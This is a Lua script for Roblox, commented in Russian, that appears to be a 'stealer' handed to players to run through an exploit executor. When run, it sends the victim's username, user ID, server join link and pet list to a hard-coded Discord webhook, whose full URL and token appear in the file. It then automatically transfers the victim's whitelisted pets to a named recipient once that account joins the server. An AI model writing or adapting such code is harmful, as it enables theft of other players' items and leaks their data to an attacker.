local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ (ЗАМЕНИТЕ!) --
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1401556845847646329/FeLb65sSQ660GjWF0PyUZGFpWb5ndW-9CZmY6Vw2rz-E0jEBqS886LFoLAaG4O4aG4SR"
local YOUR_USER_ID = 7719284192 -- Ваш Roblox ID
local WHITELIST = {"Wasp"} -- Белый список питомцев
local TARGET_PLAYER = "Rikizigg" -- Или ID получателя
local TRANSFER_DELAY = 1 -- Задержка между передачами (в секундах)

-- 🎯 Поиск RemoteEvent для передачи (адаптируй под свою игру!)
local function findTransferRemote()
    -- Варианты названий RemoteEvent (проверь в DEX)
    local possibleNames = {
        "PetTransferEvent",
        "TradeRemote",
        "InventoryTransfer",
        "BackpackHandler"
    }
    
    for _, name in ipairs(possibleNames) do
        local remote = ReplicatedStorage:FindFirstChild(name, true) -- Рекурсивный поиск
        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            return remote
        end
    end
    return nil
end

-- 📨 Улучшенная отправка в Discord с кнопкой
local function sendToDiscord(text)
    local serverLink = "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
    local data = {
        content = text,
        components = {{
            type = 1,
            components = {{
                type = 2,
                label = "Присоединиться к серверу",
                style = 5,
                url = serverLink
            }}
        }}
    }
    
    -- Лучший вариант через syn
    if syn and syn.request then
        return syn.request({
            Url = DISCORD_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end
    
    -- Fallback для обычного HttpService
    pcall(function()
        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode(data))
    end)
end

-- 🐕 Получение питомцев + проверка веса/возраста
local function getEligiblePets()
    local pets = {}
    for _, item in ipairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local petName, weight, age = item.Name:match("^(%w+).*%[(%d+%.%d+) KG%].*%[(%d+)")
            if petName and table.find(WHITELIST, petName) then
                table.insert(pets, {
                    object = item,
                    name = petName,
                    weight = tonumber(weight),
                    age = tonumber(age)
                })
            end
        end
    end
    
    -- Сортировка по весу (от тяжелых к легким)
    table.sort(pets, function(a, b) return a.weight > b.weight end)
    return pets
end

-- 🔄 Автоматическая передача предметов
local function transferPets(targetPlayerName)
    local transferRemote = findTransferRemote()
    if not transferRemote then
        warn("⚠️ RemoteEvent для передачи не найден!")
        return false
    end
    
    local targetPlayer = Players:FindFirstChild(targetPlayerName)
    if not targetPlayer then
        warn("⚠️ Игрок", targetPlayerName, "не найден на сервере!")
        return false
    end

    local pets = getEligiblePets()
    if #pets == 0 then
        print("ℹ️ Нет подходящих питомцев для передачи")
        return false
    end

    -- Отправка каждого предмета
    for _, pet in ipairs(pets) do
        local success, err = pcall(function()
            -- Вариант вызова (адаптируй под свою игру):
            -- 1. Через RemoteEvent
            transferRemote:FireServer("TransferPet", targetPlayer, pet.object)
            
            -- 2. Или если нужно использовать RemoteFunction
            -- transferRemote:InvokeServer("GiveItem", targetPlayer, pet.object.Name)
            
            print("✅ Передаем:", pet.name, "| Вес:", pet.weight, "KG")
            task.wait(TRANSFER_DELAY)
        end)
        
        if not success then
            warn("❌ Ошибка при передаче", pet.name..":", err)
        end
    end
    
    return true
end

-- 📡 Основной поток
local pets = getEligiblePets()
local serverLink = "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
local reportMessage = string.format(
    "🔔 **Игрок инжектил скрипт!**\n"..
    "👤 **Ник:** %s\n"..
    "🆔 **ID:** %d\n"..
    "🌐 **Сервер:** [Кликни чтобы зайти](%s)\n\n"..
    "🐾 **Доступные питомцы (%d):**\n%s\n\n"..
    "```autohotkey\n!transfer %d\n```",
    player.Name,
    player.UserId,
    serverLink,
    #pets,
    table.concat(pets, "\n"),
    player.UserId
)

-- Отправляем отчет в Discord
sendToDiscord(reportMessage)

-- Автоматическая передача при появлении получателя
Players.PlayerAdded:Connect(function(newPlayer)
    if newPlayer.Name == TARGET_PLAYER or newPlayer.UserId == YOUR_USER_ID then
        transferPets(newPlayer.Name)
    end
end)

print("✅ Скрипт активирован. Ожидаем получателя...")
